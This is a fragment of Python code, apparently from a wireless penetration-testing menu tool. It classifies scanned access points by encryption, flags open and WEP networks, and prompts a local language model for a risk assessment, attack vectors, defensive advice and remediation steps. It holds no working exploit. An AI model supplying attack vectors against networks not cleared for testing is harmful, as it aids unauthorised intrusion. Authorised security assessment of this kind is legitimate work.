                if hasattr(ai_client, 'query_ollama'):
                    # Prepare scan data for AI analysis
                    aps = wireless.scan_results.get('access_points', [])
                    clients = wireless.scan_results.get('clients', [])
                    
                    analysis_data = {
                        'total_aps': len(aps),
                        'total_clients': len(clients),
                        'security_breakdown': {},
                        'vulnerable_networks': []
                    }
                    
                    # Analyze security
                    for ap in aps:
                        security = ap['privacy']
                        if security in analysis_data['security_breakdown']:
                            analysis_data['security_breakdown'][security] += 1
                        else:
                            analysis_data['security_breakdown'][security] = 1
                        
                        if security in ['', 'OPN', 'WEP']:
                            analysis_data['vulnerable_networks'].append({
                                'essid': ap['essid'],
                                'bssid': ap['bssid'],
                                'security': security
                            })
                    
                    prompt = f"""
                    Analyze this wireless network scan data and provide security recommendations:
                    
                    Scan Results:
                    {json.dumps(analysis_data, indent=2)}
                    
                    Provide:
                    1. Security risk assessment
                    2. Attack vectors for vulnerable networks
                    3. Defensive recommendations
                    4. Prioritized remediation steps
                    """
                    
                    response = ai_client.query_ollama(prompt)
                    console.print(Panel(response, title="🤖 AI Wireless Security Analysis", 
                                      border_style="blue"))
            
        elif choice == "9":
            # Generate report
            with console.status("📊 Generating wireless pentest report..."):
                report_file = wireless.generate_wireless_report()
            
            console.print(f"[green]✅ Report generated: {report_file}[/green]")
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    run_wireless_pentest_menu("test", "/tmp", None)
